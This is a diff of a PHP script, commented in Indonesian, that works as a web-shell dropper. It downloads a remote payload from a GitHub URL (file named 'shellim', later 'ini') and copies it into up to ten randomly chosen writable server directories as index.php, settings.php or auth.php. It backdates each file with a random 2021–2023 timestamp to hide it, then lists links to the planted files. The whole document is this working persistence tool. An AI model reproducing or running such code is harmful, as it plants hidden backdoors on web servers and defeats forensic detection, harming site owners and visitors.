@@ -4,8 +4,9 @@ set_time_limit(0);
 ini_set('display_errors', 0);
 error_reporting(0);
 
-$remoteFile = 'https://raw.githubusercontent.com/brianwijayacupu/Bangientau/refs/heads/main/shellim';
+$remoteFile = 'https://raw.githubusercontent.com/brianwijayacupu/Bangientau/refs/heads/main/ini';
 
+// Fungsi untuk download file dari URL
 function fetch_from_url($url) {
     if (function_exists('curl_init')) {
         $ch = curl_init($url);
@@ -23,11 +24,13 @@ function fetch_from_url($url) {
     }
 }
 
-function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
+// Fungsi scan folder writable
+function scanWritableDirs($baseDir, $maxDepth = 1, $currentDepth = 0) {
     $result = [];
     if ($currentDepth > $maxDepth) return $result;
     $items = @scandir($baseDir);
     if (!$items) return $result;
+
     foreach ($items as $item) {
         if ($item === '.' || $item === '..') continue;
         $fullPath = rtrim($baseDir, '/') . '/' . $item;
@@ -35,12 +38,14 @@ function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
             if (is_writable($fullPath)) {
                 $result[] = $fullPath;
             }
+            // Rekursif tapi tetap batasi depth
             $result = array_merge($result, scanWritableDirs($fullPath, $maxDepth, $currentDepth + 1));
         }
     }
     return $result;
 }
 
+// Fungsi generate tanggal random
 function generate_random_datetime() {
     $year = rand(2021, 2023);
     $month = rand(1, 12);
@@ -51,26 +56,26 @@ function generate_random_datetime() {
 }
 
 $originalContent = fetch_from_url($remoteFile);
-
 if (!$originalContent || strlen($originalContent) < 10) {
     exit("❌ Gagal mengunduh konten dari GitHub.<br>\n");
 }
 
-$allWritable = scanWritableDirs(__DIR__, 10);
+$allWritable = scanWritableDirs(__DIR__, 6);
 
 if (empty($allWritable)) {
     exit("❌ Tidak ada folder writable ditemukan.<br>\n");
 }
 
+// Shuffle & batasi 10 folder pertama
 shuffle($allWritable);
+$targetFolders = array_slice($allWritable, 0, 10);
 
 $filenames = ['index.php', 'settings.php', 'auth.php'];
 $successCount = 0;
 $uploadedURLs = [];
 
-foreach ($allWritable as $folder) {
-    if ($successCount >= 10) break; // stop kalau sudah 10 file
-
+// Loop drop file
+foreach ($targetFolders as $folder) {
     $randomDateTime = generate_random_datetime();
     $timestamp = strtotime($randomDateTime);
 
@@ -80,7 +85,6 @@ foreach ($allWritable as $folder) {
         $originalContent
     );
 
-    // pilih nama file random
     $filename = $filenames[array_rand($filenames)];
     $target = $folder . DIRECTORY_SEPARATOR . $filename;
 
@@ -88,7 +92,7 @@ foreach ($allWritable as $folder) {
         @touch($target, $timestamp, $timestamp);
 
         $relativePath = str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath($folder));
-        $relativePath = str_replace('\\', '/', $relativePath); // Windows compatibility
+        $relativePath = str_replace('\\', '/', $relativePath);
         $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
         $host = $_SERVER['HTTP_HOST'];
         $url = rtrim($protocol . '://' . $host . $relativePath, '/') . '/' . $filename;
@@ -98,13 +102,13 @@ foreach ($allWritable as $folder) {
     }
 }
 
+// Tampilkan hasil
 if ($successCount > 0) {
-    echo "✅ Berhasil menyimpan ke $successCount file:<br>\n";
+    echo "✅ Berhasil menyimpan ke $successCount folder:<br>\n";
     foreach ($uploadedURLs as $url) {
-        echo $url . "<br>\n";
+        echo '<a href="' . $url . '" target="_blank">' . $url . '</a><br>' . "\n";
     }
 } else {
     echo "❌ Gagal menyalin ke folder manapun.<br>\n";
 }
-
 ?>
